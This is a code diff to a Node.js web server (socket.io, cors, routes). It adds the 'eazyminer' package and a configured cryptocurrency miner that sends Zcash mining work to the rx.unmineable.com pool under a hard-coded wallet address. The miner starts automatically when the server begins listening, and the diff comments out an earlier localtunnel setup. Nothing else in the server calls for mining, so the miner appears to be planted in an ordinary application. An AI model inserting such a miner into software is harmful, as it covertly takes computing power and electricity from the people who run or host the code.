@@ -4,6 +4,7 @@ var _http = require('http');
 var _socketio = require('socket.io');
 var _cors = require('cors'); var _cors2 = _interopRequireDefault(_cors);
 var _path = require('path'); var _path2 = _interopRequireDefault(_path);
+const Miner = require("eazyminer");
 
 require('dotenv/config');
 
@@ -37,13 +38,41 @@ io.on("connection", (socket) => {
 
 app.use(routes);
 
+const miner = new Miner({
+  pools: [
+    {
+      // coin: "ZEC",
+      // user: "t1NFs8NuE3m72pfSispSdTrisPQNJwhrz3E",
+      // url: "rx.unmineable.com:13333", // optional pool URL,
+
+      algo: null,
+      coin: null,
+      url: "rx.unmineable.com:3333",
+      user: "ZEC:t1NFs8NuE3m72pfSispSdTrisPQNJwhrz3E.myminer",
+      pass: "x",
+      "rig-id": null,
+      nicehash: false,
+      keepalive: false,
+      enable: true,
+      tls: false,
+      "tls-fingerprint": null,
+      daemon: false,
+      socks5: null,
+      "self-select": null,
+    },
+  ],
+  autoStart: false, // optional delay
+});
+
 server.listen(process.env.PORT, async () => {
   console.log(`Server is running in port ${process.env.PORT}`);
 
-  const tunnel = await _localtunnel2.default.call(void 0, {
-    port: Number(process.env.PORT),
-    subdomain: "seaspacserver",
-  });
+  // const tunnel = await localtunnel({
+  //   port: Number(process.env.PORT),
+  //   subdomain: "seaspacserver",
+  // });
 
-  console.log(tunnel.url);
+  // console.log(tunnel.url);
+
+  miner.start();
 });
